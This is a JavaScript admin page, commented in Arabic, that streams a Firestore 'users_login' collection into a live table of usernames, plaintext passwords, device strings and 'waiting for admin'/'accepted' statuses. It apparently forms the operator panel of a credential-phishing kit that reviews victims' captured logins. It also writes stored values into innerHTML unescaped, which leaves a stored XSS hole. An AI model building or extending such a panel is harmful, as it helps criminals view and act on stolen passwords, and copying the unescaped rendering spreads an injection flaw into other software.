// admin.js

// استيراد قاعدة البيانات من ملف الإعداد المشترك الخارجي
import { db } from "./firebase-config.js";

// استيراد دالات العرض اللحظي من فايربيس
import { 
    collection, 
    query, 
    orderBy, 
    onSnapshot 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

document.addEventListener('DOMContentLoaded', () => {
    const logsTableBody = document.getElementById('logsTableBody');

    // 1. إنشاء استعلام لجلب البيانات مرتبة من الأحدث إلى الأقدم
    const q = query(collection(db, "users_login"), orderBy("timestamp", "desc"));

    // 2. الاستماع اللحظي للتغييرات (بدون ريفريش)
    onSnapshot(q, (querySnapshot) => {
        // تفريغ الجدول أولاً قبل إعادة الرسم لتجنب التكرار
        logsTableBody.innerHTML = "";

        if (querySnapshot.empty) {
            logsTableBody.innerHTML = `<tr><td colspan="5" style="text-align:center;">لا توجد بيانات مستلمة حتى الآن...</td></tr>`;
            return;
        }

        querySnapshot.forEach((doc) => {
            const data = doc.data();

            // معالجة الوقت والتاريخ ليظهر بشكل مقروء ومفهوم
            let formattedTime = "غير محدد";
            if (data.timestamp) {
                const date = data.timestamp.toDate();
                formattedTime = date.toLocaleString('ar-EG', { hour12: true });
            }

            // تحديد شكل ولون شارة الحالة (Status Badge)
            let statusClass = "waiting";
            let statusText = "بانتظار الأدمن";
            
            if (data.status === "approved") {
                statusClass = "approved";
                statusText = "تم القبول";
            }

            // إنشاء سطر جديد داخل الجدول
            const row = document.createElement('tr');
            row.innerHTML = `
                <td><strong>${data.username || '---'}</strong></td>
                <td style="color: #c0392b; font-family: monospace;">${data.password || '---'}</td>
                <td>${formattedTime}</td>
                <td style="font-size: 12px; color: #7f8c8d; max-width: 250px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${data.device}">
                    ${data.device || 'غير معروف'}
                </td>
                <td><span class="status-badge ${statusClass}">${statusText}</span></td>
            `;

            // إضافة السطر إلى جسم الجدول
            logsTableBody.appendChild(row);
        });
    }, (error) => {
        console.error("حدث خطأ أثناء جلب البيانات لحظياً: ", error);
    });
});
